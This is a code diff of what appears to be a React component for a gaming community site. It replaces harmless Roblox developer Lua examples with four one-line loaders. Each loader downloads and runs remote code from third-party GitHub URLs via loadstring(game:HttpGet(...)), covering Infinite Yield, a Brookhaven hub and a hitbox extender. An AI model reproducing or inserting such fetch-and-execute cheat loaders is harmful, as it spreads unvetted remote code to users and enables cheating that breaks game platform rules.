@@ -29,41 +29,24 @@ const rules = [
 const scripts = [
   {
     id: 1,
-    name: 'Developer Script Hub',
-    code: `-- // Developer Script Hub (Mobile-Friendly)
--- Place in StarterGui > ScreenGui > LocalScript
--- Safe for developer/admin use only (not exploits)
-
-local Players = game:GetService("Players")
-local UIS = game:GetService("UserInputService")
-local RunService = game:GetService("RunService")
-local LocalPlayer = Players.LocalPlayer`
+    name: 'Infinite Yield',
+    code: `loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()`
   },
   {
     id: 2,
-    name: 'Admin Commands',
-    code: `-- Admin Commands Script
-local Players = game:GetService("Players")
-local player = Players.LocalPlayer
-
-function teleport(targetName)
-    local target = Players:FindFirstChild(targetName)
-    if target then
-        player.Character:MoveTo(target.Character.HumanoidRootPart.Position)
-    end
-end`
+    name: 'Mango Hub für Brookhaven',
+    code: `loadstring(game:HttpGet("https://raw.githubusercontent.com/rogelioajax/lua/main/MangoHub", true))()`
   },
   {
     id: 3,
-    name: 'Speed Boost',
-    code: `-- Speed Boost Script
-local player = game.Players.LocalPlayer
-local character = player.Character or player.CharacterAdded:Wait()
-local humanoid = character:WaitForChild("Humanoid")
-
-humanoid.WalkSpeed = 50
-print("Speed boosted to 50!")`
-  }
+    name: 'Realistic Hood (oder in paar andere hitbox extender)',
+    code: `loadstring(game:HttpGet("https://raw.githubusercontent.com/YellowGregs/Loadstring/refs/heads/main/rhtestesting.lua"))()`
+  },
+  {
+    id: 4,
+    name: 'Dynamic Oma 👩‍🦳',
+    code: `loadstring(game:HttpGet("https://raw.githubusercontent.com/DEERSTUDIO101/Vanith_script/refs/heads/main/Vanith_v1.lua",true))()`
+  },
 ];
 
 export function ServerInfo({ staff, channels, isLoading }: ServerInfoProps) {
